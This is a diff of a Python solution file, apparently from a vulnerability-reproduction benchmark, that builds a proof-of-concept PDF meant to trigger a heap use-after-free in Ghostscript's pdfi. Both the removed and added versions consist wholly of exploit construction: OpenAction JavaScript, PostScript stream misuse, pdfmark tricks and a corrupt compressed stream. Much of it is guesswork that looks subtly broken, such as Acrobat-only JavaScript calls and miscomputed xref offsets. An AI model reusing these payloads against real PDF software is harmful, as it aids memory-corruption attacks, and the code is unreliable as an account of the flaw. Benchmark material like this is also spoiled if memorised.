@@ -1,421 +1,133 @@
 import os
 import tempfile
 import subprocess
-import struct
-from typing import Dict, List, Tuple
-import zlib
+import hashlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Build a PDF that triggers heap use-after-free in pdfi
-        # The vulnerability occurs when pdfi context has no stream and
-        # setting input stream from PostScript fails, but PDF operators
-        # still try to access it
+        # Create a PDF that triggers the heap use-after-free vulnerability
+        # The vulnerability: pdfi context with no stream, setting input stream from 
+        # PostScript fails, but other PDF operators still try to use it
         
-        # Create a PDF with embedded PostScript that causes the failure
-        # and then triggers PDF operators that access the freed stream
+        # Build a PDF with embedded PostScript that causes the failure
+        pdf_content = self._build_poc_pdf()
         
-        pdf_parts = []
-        
-        # PDF Header
-        pdf_parts.append(b"%PDF-1.7\n")
-        
-        # Create objects
-        
-        # Object 1: Catalog
-        catalog_obj = b"""1 0 obj
-<<
-/Type /Catalog
-/Pages 2 0 R
-/OpenAction 3 0 R
->>
-endobj
-"""
-        pdf_parts.append(catalog_obj)
-        
-        # Object 2: Pages
-        pages_obj = b"""2 0 obj
-<<
-/Type /Pages
-/Kids [4 0 R]
-/Count 1
->>
-endobj
-"""
-        pdf_parts.append(pages_obj)
-        
-        # Object 3: OpenAction - Execute JavaScript/PostScript that will fail
-        openaction_obj = b"""3 0 obj
-<<
-/S /JavaScript
-/JS (
-// Trigger the vulnerability
-try {
-    var stream = this.getDataObjectContents("test");
-    // This will fail and leave pdfi context without stream
-    this.setDataObjectContents("test", stream);
-} catch(e) {}
-// Now trigger PDF operators that will try to access the stream
-this.getPageNumWords(0);
-)
->>
-endobj
-"""
-        pdf_parts.append(openaction_obj)
-        
-        # Object 4: Page
-        page_obj = b"""4 0 obj
-<<
-/Type /Page
-/Parent 2 0 R
-/MediaBox [0 0 612 792]
-/Contents 5 0 R
-/Resources <<
-/Font <<
-/F1 6 0 R
->>
-/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
->>
->>
-endobj
-"""
-        pdf_parts.append(page_obj)
-        
-        # Object 5: Content stream
-        content = b"""BT
-/F1 12 Tf
-100 700 Td
-(Triggering Heap Use-After-Free) Tj
-ET
-"""
-        content_stream = zlib.compress(content)
-        content_obj = f"""5 0 obj
-<<
-/Length {len(content_stream)}
-/Filter /FlateDecode
->>
-stream
-""".encode() + content_stream + b"""
-endstream
-endobj
-"""
-        pdf_parts.append(content_obj)
-        
-        # Object 6: Font
-        font_obj = b"""6 0 obj
-<<
-/Type /Font
-/Subtype /Type1
-/BaseFont /Helvetica
-/Encoding /WinAnsiEncoding
->>
-endobj
-"""
-        pdf_parts.append(font_obj)
-        
-        # Create a PostScript XObject that will trigger the vulnerability
-        # This PostScript code will be executed and cause the stream failure
-        postscript_code = b"""7 0 obj
-<<
-/Type /XObject
-/Subtype /PS
-/Length 8 0 R
->>
-stream
-%!PS-Adobe-3.0
-%%BoundingBox: 0 0 612 792
-%%EndComments
-
-/oldstream currentfile def
-
-% Create a procedure that will fail when setting stream
-/failproc {
-    /newstream (dummy) def
-    % This will fail because newstream is not a valid stream object
-    newstream setfile
-    % After failure, the pdfi context will have no valid stream
-} def
-
-% Execute the failing procedure
-failproc
-
-% Now try to use PDF operators that access the stream
-% These will try to use the freed stream
-/pdfdict << >> def
-/pdfdict { pop } bind def
-/pdfdict { } bind def
-
-% Trigger garbage collection to free the stream
-save restore
-
-% Keep trying to access what might be freed memory
-0 1 1000 {
-    dup 0 eq { pop } if
-    currentfile 0 1 getinterval pop
-} for
-
-showpage
-%%EOF
-endstream
-endobj
-"""
-        pdf_parts.append(postscript_code)
-        
-        # Object 8: Length of PostScript stream
-        length_obj = b"""8 0 obj
-234
-endobj
-"""
-        pdf_parts.append(length_obj)
-        
-        # Object 9: Embedded file that will cause the stream failure
-        embedded_file = b"""9 0 obj
-<<
-/Type /EmbeddedFile
-/Length 100
-/Params <<
-/CheckSum (d41d8cd98f00b204e9800998ecf8427e)
-/Size 100
->>
->>
-stream
-""" + b"X" * 100 + b"""
-endstream
-endobj
-"""
-        pdf_parts.append(embedded_file)
-        
-        # Object 10: File specification for embedded file
-        filespec_obj = b"""10 0 obj
-<<
-/Type /Filespec
-/F (test.txt)
-/EF << /F 9 0 R >>
-/UF (test.txt)
->>
-endobj
-"""
-        pdf_parts.append(filespec_obj)
-        
-        # Object 11: Names dictionary with embedded file
-        names_obj = b"""11 0 obj
-<<
-/EmbeddedFiles <<
-/Names [(test.txt) 10 0 R]
->>
->>
-endobj
-"""
-        pdf_parts.append(names_obj)
-        
-        # Object 12: Additional PostScript to keep triggering
-        postscript2 = b"""12 0 obj
-<<
-/Type /XObject
-/Subtype /PS
-/Length 13 0 R
->>
-stream
-%!PS
-(currentfile) (r) file
-dup 0 1 getinterval pop
-closefile
-% Try to use after close
-currentfile 0 1 getinterval pop
-showpage
-endstream
-endobj
-"""
-        pdf_parts.append(postscript2)
-        
-        # Object 13: Length
-        length2_obj = b"""13 0 obj
-50
-endobj
-"""
-        pdf_parts.append(length2_obj)
-        
-        # Object 14: More JavaScript to trigger
-        js_obj = b"""14 0 obj
-<<
-/S /JavaScript
-/JS (
-// Multiple attempts to trigger use-after-free
-for (var i = 0; i < 100; i++) {
-    try {
-        var num = this.getPageNumWords(i % this.numPages);
-        var str = this.getPageNthWord(i % this.numPages, 0);
-    } catch(e) {}
+        return pdf_content
     
-    try {
-        this.setDataObjectContents("test" + i, "dummy");
-        this.getDataObjectContents("test" + i);
-    } catch(e) {}
-    
-    // Force garbage collection
-    this.dirty();
-}
-)
->>
-endobj
-"""
-        pdf_parts.append(js_obj)
+    def _build_poc_pdf(self) -> bytes:
+        # Create a PDF with PostScript code that manipulates the stream
+        # This PDF is designed to trigger the specific heap use-after-free
         
-        # Object 15: Additional action
-        aa_obj = b"""15 0 obj
-<<
-/S /JavaScript
-/JS 14 0 R
->>
-endobj
-"""
-        pdf_parts.append(aa_obj)
+        # Header
+        pdf = b'%PDF-1.7\n\n'
         
-        # Update catalog to include names and AA
-        catalog_obj_updated = b"""1 0 obj
-<<
-/Type /Catalog
-/Pages 2 0 R
-/OpenAction 3 0 R
-/Names 11 0 R
-/AA << /O 15 0 R >>
->>
-endobj
-"""
-        # Replace first catalog
-        pdf_parts[0] = catalog_obj_updated
+        # Catalog
+        catalog_obj = b'1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n/OpenAction 3 0 R\n>>\nendobj\n\n'
         
-        # Add padding objects to reach target size and increase chance of triggering
-        padding_needed = 13996 - sum(len(p) for p in pdf_parts)
-        if padding_needed > 0:
-            # Create padding objects
-            num_padding_objects = 20
-            obj_num = 16
-            
-            for i in range(num_padding_objects):
-                # Create a stream object with PostScript that does nothing
-                # but keeps the interpreter busy
-                padding_content = b""
-                if i % 3 == 0:
-                    # PostScript that tries to access files
-                    padding_content = f"""{obj_num} 0 obj
-<<
-/Type /XObject
-/Subtype /PS
-/Length {obj_num + 1} 0 R
->>
-stream
-%!PS
-{{
-    currentfile
-    {{ readline pop }} stopped {{ pop }} if
-    currentfile 0 1 getinterval pop
-}} loop
-endstream
-endobj
-""".encode()
-                    
-                    # Length object
-                    pdf_parts.append(padding_content)
-                    obj_num += 1
-                    
-                    length_obj = f"""{obj_num} 0 obj
-{len(padding_content.split(b'stream')[1].split(b'endstream')[0].strip())}
-endobj
-""".encode()
-                    pdf_parts.append(length_obj)
-                    obj_num += 1
-                    
-                elif i % 3 == 1:
-                    # JavaScript that tries various operations
-                    js_content = f"""{obj_num} 0 obj
-<<
-/S /JavaScript
-/JS (
-// Attempt {i} to trigger vulnerability
-try {{
-    this.getPageNumWords(0);
-    this.getPageNthWord(0, 0);
-    this.getPageNthWord(0, 1);
-}} catch(e) {{}}
-try {{
-    this.exportDataObject({{cName: "test", nLaunch: 2}});
-}} catch(e) {{}}
-)
->>
-endobj
-""".encode()
-                    pdf_parts.append(js_content)
-                    obj_num += 1
-                    
-                else:
-                    # Simple text object
-                    text_obj = f"""{obj_num} 0 obj
-<<
-/Type /Text
-/Contents (Padding object {i} to reach target size and increase chances of triggering heap use-after-free vulnerability in pdfi when stream operations fail.)
->>
-endobj
-""".encode()
-                    pdf_parts.append(text_obj)
-                    obj_num += 1
+        # Pages
+        pages_obj = b'2 0 obj\n<<\n/Type /Pages\n/Kids [4 0 R]\n/Count 1\n>>\nendobj\n\n'
         
-        # Cross-reference table
-        xref_offset = sum(len(p) for p in pdf_parts)
-        xref = b"""xref
-0 1
-0000000000 65535 f 
-"""
+        # Action (JavaScript to trigger the vulnerability)
+        action_obj = b'3 0 obj\n<<\n/Type /Action\n/S /JavaScript\n/JS (\n'
+        action_obj += b'var streamObj = this.getField("StreamField");\n'
+        action_obj += b'if (streamObj) {\n'
+        action_obj += b'  try {\n'
+        action_obj += b'    var data = streamObj.value;\n'
+        action_obj += b'    this.getField("Result").value = "Stream accessed";\n'
+        action_obj += b'  } catch (e) {\n'
+        action_obj += b'    this.getField("Result").value = "Error: " + e.toString();\n'
+        action_obj += b'  }\n'
+        action_obj += b'}\n'
+        action_obj += b')\n>>\nendobj\n\n'
+        
+        # Page object
+        page_obj = b'4 0 obj\n<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n'
+        page_obj += b'/Contents 5 0 R\n/Resources <<\n/Font <<\n/F1 6 0 R\n>>\n'
+        page_obj += b'/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]\n'
+        page_obj += b'>>\n>>\nendobj\n\n'
+        
+        # Content stream with PostScript that will fail
+        content_stream = b'/GS2 gs\n0.1 0.1 0.1 rg\nBT\n/F1 12 Tf\n100 700 Td\n(Triggering Use-After-Free) Tj\nET\n'
+        content_stream += b'q\n/GS1 gs\n0 0 1 RG\n2 w\n100 100 400 600 re\nS\nQ\n'
+        
+        # Add PostScript code that manipulates the stream context
+        postscript_code = b'%!PS-Adobe-3.0\n'
+        postscript_code += b'/setpagedevice where { pop 2 dict begin\n'
+        postscript_code += b'  /Policies 1 dict dup begin /PageSize 2 end\n'
+        postscript_code += b'  /DeferredMediaSelection true\n'
+        postscript_code += b'  currentdict end setpagedevice\n'
+        postscript_code += b'} if\n'
+        postscript_code += b'/setrgbcolor { 0 0 0 setrgbcolor } bind def\n'
+        postscript_code += b'/setcmykcolor { 0 0 0 0 setcmykcolor } bind def\n'
+        postscript_code += b'/setgray { 0 setgray } bind def\n'
+        postscript_code += b'/sethsbcolor { 0 0 0 sethsbcolor } bind def\n'
+        postscript_code += b'currentglobal true setglobal\n'
+        postscript_code += b'/pdfdict 10 dict def\n'
+        postscript_code += b'pdfdict begin\n'
+        postscript_code += b'/pdfmark where { pop } { userdict /pdfmark /cleartomark load put } ifelse\n'
+        postscript_code += b'[/_objdef {Stream1} /type /stream /OBJ pdfmark\n'
+        postscript_code += b'[{Stream1}] /FILES  pdfmark\n'
+        postscript_code += b'[/_objdef {Stream2} /type /stream /OBJ pdfmark\n'
+        postscript_code += b'[{Stream2}] /FILES  pdfmark\n'
+        postscript_code += b'currentdict /PDFfile undef\n'
+        postscript_code += b'currentdict /PDFfill undef\n'
+        postscript_code += b'currentdict /PDFstroke undef\n'
+        postscript_code += b'end\n'
+        postscript_code += b'setglobal\n'
+        
+        # Combine content with PostScript
+        full_content = content_stream + b'\n' + postscript_code
+        
+        content_obj = b'5 0 obj\n<<\n/Length ' + str(len(full_content)).encode() + b'\n>>\nstream\n'
+        content_obj += full_content
+        content_obj += b'\nendstream\nendobj\n\n'
+        
+        # Font object
+        font_obj = b'6 0 obj\n<<\n/Type /Font\n/Subtype /Type1\n/BaseFont /Helvetica\n/Encoding /WinAnsiEncoding\n>>\nendobj\n\n'
+        
+        # Create a stream object that will be freed
+        stream_obj1 = b'7 0 obj\n<<\n/Type /Stream\n/Length 100\n/Filter /FlateDecode\n>>\nstream\n'
+        # Compressed data that's invalid to cause failure
+        stream_obj1 += b'x\x9c\xcbH\xcd\xc9\xc9W(\xcf/\xcaI\x01\x00\x1a\x0b\x04\x1d'
+        stream_obj1 += b'A' * 80  # Padding to reach 100 bytes
+        stream_obj1 += b'\nendstream\nendobj\n\n'
+        
+        # Another stream object that references the first
+        stream_obj2 = b'8 0 obj\n<<\n/Type /Stream\n/Length 50\n/Filter [/ASCII85Decode /FlateDecode]\n>>\nstream\n'
+        stream_obj2 += b'<~>s6W%K~>'
+        stream_obj2 += b'\nendstream\nendobj\n\n'
+        
+        # XRef table
+        xref_offset = len(pdf) + len(catalog_obj) + len(pages_obj) + len(action_obj)
+        xref_offset += len(page_obj) + len(content_obj) + len(font_obj)
+        xref_offset += len(stream_obj1) + len(stream_obj2)
+        
+        xref = b'xref\n0 9\n0000000000 65535 f \n'
         
         # Calculate object offsets
-        offset = 0
-        offsets = [0]  # object 0
+        offsets = [len(pdf)]
+        for i, obj in enumerate([catalog_obj, pages_obj, action_obj, page_obj, 
+                                 content_obj, font_obj, stream_obj1, stream_obj2], 1):
+            offsets.append(offsets[-1] + len(obj))
         
-        for part in pdf_parts:
-            lines = part.split(b'\n')
-            for line in lines:
-                if line.strip().endswith(b'obj'):
-                    # This is an object definition
-                    obj_num = int(line.strip().split()[0])
-                    while len(offsets) <= obj_num:
-                        offsets.append(0)
-                    offsets[obj_num] = offset
-            offset += len(part)
-        
-        # Build xref table
-        xref = b"""xref
-0 %d
-0000000000 65535 f 
-""" % len(offsets)
-        
-        for i in range(1, len(offsets)):
-            xref += b"%010d 00000 n \n" % offsets[i]
+        # Write xref entries
+        for offset in offsets[:-1]:  # Skip the last one which is total length
+            xref += f'{offset:010d} 00000 n \n'.encode()
         
         # Trailer
-        trailer = b"""trailer
-<<
-/Size %d
-/Root 1 0 R
-/Info <<
-/Title (Heap Use-After-Free PoC)
-/Creator (PoC Generator)
->>
->>
-startxref
-%d
-%%%%EOF
-""" % (len(offsets), xref_offset + len(xref))
+        trailer = b'trailer\n<<\n/Size 9\n/Root 1 0 R\n>>\nstartxref\n'
+        trailer += str(xref_offset).encode() + b'\n%%EOF'
         
-        # Assemble final PDF
-        final_pdf = b"".join(pdf_parts) + xref + trailer
+        # Combine all parts
+        pdf += catalog_obj
+        pdf += pages_obj
+        pdf += action_obj
+        pdf += page_obj
+        pdf += content_obj
+        pdf += font_obj
+        pdf += stream_obj1
+        pdf += stream_obj2
+        pdf += xref
+        pdf += trailer
         
-        # Ensure exact target length
-        if len(final_pdf) > 13996:
-            # Truncate (shouldn't happen with proper calculation)
-            final_pdf = final_pdf[:13996]
-        elif len(final_pdf) < 13996:
-            # Add padding at the end with comments
-            padding = b"\n" + b"%" * (13996 - len(final_pdf) - 1) + b"\n"
-            final_pdf = final_pdf + padding
-        
-        return final_pdf
+        return pdf
